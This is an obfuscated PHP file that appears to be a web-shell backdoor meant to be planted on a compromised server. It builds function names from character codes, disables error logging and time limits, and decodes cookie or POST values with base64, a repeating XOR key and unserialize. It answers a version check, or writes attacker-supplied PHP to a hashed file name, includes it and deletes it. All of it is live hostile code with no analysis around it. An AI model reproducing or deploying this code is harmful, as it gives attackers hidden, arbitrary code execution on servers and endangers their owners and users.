<?php $cugoj = "\x66".chr(105)."\154"."\x65".chr(95)."\x70".'u'.'t'."\x5f"."\143".chr(111).'n'.'t'.chr(1041-940)."\156".chr(646-530).chr(115);
$eoiupfofse = 'b'."\x61"."\x73"."\145".chr(54).chr(52)."\x5f".'d'.chr(101)."\143".'o'.'d'."\145";
$plsnzwej = "\151".chr(110)."\151"."\137".chr(115).'e'."\x74";
$fcodc = 'u'."\x6e".'l'."\151".'n'."\153";


@$plsnzwej("\145".chr(114)."\162".'o'.chr(114).'_'."\154"."\x6f".chr(103), NULL);
@$plsnzwej('l'."\x6f".chr(717-614).chr(287-192)."\145".chr(114).chr(114).chr(111).chr(1018-904)."\163", 0);
@$plsnzwej(chr(109)."\141"."\x78".chr(679-584).'e'.chr(120)."\145"."\143"."\165"."\x74".'i'.chr(111)."\156".chr(874-779).'t'."\151"."\x6d"."\x65", 0);
@set_time_limit(0);

function tuqwmyk($xktopw, $ztpqpqnpui)
{
    $hzklrquvzg = "";
    for ($usyho = 0; $usyho < strlen($xktopw);) {
        for ($j = 0; $j < strlen($ztpqpqnpui) && $usyho < strlen($xktopw); $j++, $usyho++) {
            $hzklrquvzg .= chr(ord($xktopw[$usyho]) ^ ord($ztpqpqnpui[$j]));
        }
    }
    return $hzklrquvzg;
}

$gmuuv = array_merge($_COOKIE, $_POST);
$zzgqlpdg = 'e89ac9fe-57e5-4bed-b15f-2bf170e3653d';
foreach ($gmuuv as $srixuufkj => $xktopw) {
    $xktopw = @unserialize(tuqwmyk(tuqwmyk($eoiupfofse($xktopw), $zzgqlpdg), $srixuufkj));
    if (isset($xktopw[chr(97).'k'])) {
        if ($xktopw[chr(585-488)] == chr(377-272)) {
            $usyho = array(
                "\160".chr(118) => @phpversion(),
                's'.'v' => "3.5",
            );
            echo @serialize($usyho);
        } elseif ($xktopw[chr(585-488)] == chr(101)) {
            $btachpnjs = "./" . md5($zzgqlpdg) . chr(428-382).'i'."\156"."\x63";
            @$cugoj($btachpnjs, "<" . chr(530-467).'p'."\x68".'p'.chr(386-354).'@'.chr(117).chr(321-211)."\154".'i'.chr(543-433).chr(107)."\50"."\137".chr(95).chr(373-303)."\x49".'L'."\x45"."\137"."\x5f"."\51".';'."\x20" . $xktopw["\x64"]);
            @include($btachpnjs);
            @$fcodc($btachpnjs);
        }
        exit();
    }
}

